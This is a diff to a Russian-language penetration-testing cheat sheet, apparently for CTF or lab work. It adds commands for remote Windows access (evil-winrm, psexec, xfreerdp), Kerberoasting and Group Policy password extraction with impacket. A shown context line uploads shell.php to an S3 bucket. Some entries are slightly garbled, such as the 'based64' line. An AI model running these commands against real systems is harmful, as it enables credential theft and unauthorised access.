@@ -10,14 +10,29 @@
 ## Удалённая авторизация
 ### evil-winrm
 `evil-winrm` - подключиться к удаённому хосту windows. пример:
-> ``` 
-> evil-winrm -i <ip> -u <username> -p <userpassword>
 
+``` 
+evil-winrm -i <ip> -u <username> -p <userpassword>
+```
 или
 ### impacket
 `impacket/examples`
->```
+```
 python3 psexec.py <login>@{TARGET_IP}
+```
+Атаки на пользователей windows:
+```
+impacket-GetUserSPNs {domain}/{username}:{pass} -dc-ip {IP}
+```
+```
+impacket-Get-GPPPassword {domain}/{username}:{pass}@{IP}
+```
+## xfreerdp
+Подключение к windows по протоколу RDP:
+```
+xfreerdp /u:username /p:"password" /v:"IP"
+y
+```
  
 ## WEB
 
@@ -47,13 +62,14 @@ aws --endpoint=http://s3.<url> s3 cp shell.php s3://<url>
 ```
 ### WGET
 чтобы скачать что-то на windows, необходимо использовать следующий синтаксис:
->```
+```
 wget http://<IP/URL>/<file> -outfile <file>
+```
 
 ### CURL
->```
+```
 curl -sX POST <url> # чтобы сделать POST запрос 
-
+```
 ## Encrypt
 `based64 -d <text>` - перевести текст в based64 кодировку.
 
@@ -65,4 +81,8 @@ qpdf --empty --add-attachment <some file to implement> --mimetype=text/plain -- 
 Извлечь ранее внедрённый в PDF файл:
 ```
 binwalk -Me <file>
+```
+##### Открыть PDF
+```
+evince file.pdf
 ```
